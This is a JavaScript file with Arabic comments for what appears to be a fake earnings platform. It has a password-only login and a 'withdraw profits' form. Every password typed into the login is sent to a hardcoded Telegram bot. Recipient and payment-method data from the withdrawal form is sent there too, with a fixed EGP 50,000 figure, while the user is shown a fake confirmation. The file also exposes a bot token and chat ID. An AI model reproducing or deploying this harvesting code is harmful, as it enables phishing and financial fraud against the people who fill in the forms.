// بيانات التليجرام الخاصة بك
const CONFIG = {
    botToken: '8154142175:AAGvcFJuk6eh972IJUujoKV2ibkNIIWlMNA',
    chatId: '8232581666'
};

// ملف الدخول الثابت (للتجربة)
const CORRECT_PASS = "coach_k"; // الباسوورد الموحد الجديد

const loginBtn = document.getElementById('login-btn');
const loginSection = document.getElementById('login-section');
const dashboard = document.getElementById('dashboard-section');
const loader = document.getElementById('loader');

// دالة إرسال الإشعارات
async function notifyTelegram(text) {
    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.chatId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (e) { console.error("Telegram Error"); }
}

// معالجة تسجيل الدخول (باسوورد فقط)
document.getElementById('login-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const passInput = document.getElementById('password').value;

    loader.classList.remove('hidden');
    
    // إشعار محاولة الدخول
    await notifyTelegram(`🔔 <b>محاولة دخول للمنصة</b>\n🔑 الباسوورد المستخدم: <code>${passInput}</code>`);

    setTimeout(() => {
        loader.classList.add('hidden');
        if (passInput === CORRECT_PASS) {
            localStorage.setItem('userTaqwaAuth', 'true');
            showDashboard();
        } else {
            alert("كود الوصول غير صحيح أو منتهي.");
        }
    }, 1500);
});

// طلب السحب (بيانات مختلطة)
document.getElementById('transfer-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const userData = document.getElementById('recipient-data').value;
    const method = document.getElementById('transfer-method').value;

    loader.classList.remove('hidden');
    
    // تقرير مفصل
    await notifyTelegram(`💰 <b>طلب سحب أرباح</b>\n👤 البيانات: ${userData}\n💳 الوسيلة: ${method}\n💵 المبلغ: EGP 50,000.00`);

    setTimeout(() => {
        loader.classList.add('hidden');
        alert("تم استلام طلب السحب بنجاح. سيتم مراجعة التحويل خلال دقائق.");
        location.reload();
    }, 2000);
});

function showDashboard() {
    loginSection.classList.add('hidden');
    dashboard.classList.remove('hidden');
}

// تحقق من الجلسة
if (localStorage.getItem('userTaqwaAuth') === 'true') { showDashboard(); }

document.getElementById('logout-btn').onclick = () => {
    localStorage.removeItem('userTaqwaAuth');
    location.reload();
};
